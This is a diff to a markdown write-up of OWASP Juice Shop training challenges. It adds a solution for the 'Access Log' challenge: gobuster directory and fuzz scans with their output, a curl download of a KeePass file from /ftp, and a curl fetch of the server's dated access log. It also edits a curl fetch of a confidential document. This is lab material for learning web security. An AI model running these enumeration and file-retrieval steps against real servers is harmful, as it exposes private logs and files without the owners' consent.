@@ -2,10 +2,40 @@
 
 ## Access Log
 
+Wordlists
+* https://github.com/danielmiessler/SecLists
+* https://github.com/v0re/dirb/tree/master/wordlists
+* https://gitlab.com/kalilinux/packages/dirbuster
+
 Gain access to any access log file of the server
 
 ```bash
-TODO
+# status code is rigged (always 200 instead of 404): ignore 200 with fixed size and add delay to avoid crashing the server
+gobuster dir -u http://juiceshop:3000/ \
+  -w /hck/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
+  --exclude-length 3748 -t 1 --delay 50ms
+# output
+# /.well-known/security.txt (Status: 200) [Size: 403]
+# /api                  (Status: 500) [Size: 3017]
+# /assets               (Status: 301) [Size: 179] [--> /assets/]
+# /ftp                  (Status: 200) [Size: 11072]
+# /profile              (Status: 500) [Size: 1159]
+# /promotion            (Status: 200) [Size: 6586]
+# /redirect             (Status: 500) [Size: 3119]
+# /rest                 (Status: 500) [Size: 3019]
+# /robots.txt           (Status: 200) [Size: 28]
+# /security.txt         (Status: 200) [Size: 403]
+# /snippets             (Status: 200) [Size: 792]
+# /video                (Status: 200) [Size: 10075518]
+
+# challenge description suggests "support" team from "/ftp/" path
+curl -O juiceshop:3000/ftp/incident-support.kdbx
+
+gobuster fuzz -u http://juiceshop:3000/support/FUZZ \
+  -w /hck/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
+  --exclude-length 3748 -t 1 --delay 50ms
+
+curl "http://juiceshop:3000/support/logs/access.log.$(date '+%Y-%m-%d')"
 ```
 
 ## Confidential Document
@@ -13,9 +43,6 @@ TODO
 Access a confidential document
 
 ```bash
-# no gobuster
-# status code is rigged: always 200 instead of 404
-
 # http://juiceshop:3000/ftp/order_<ORDER_ID>.pdf
 curl -O http://juiceshop:3000/ftp/acquisitions.md
 ```
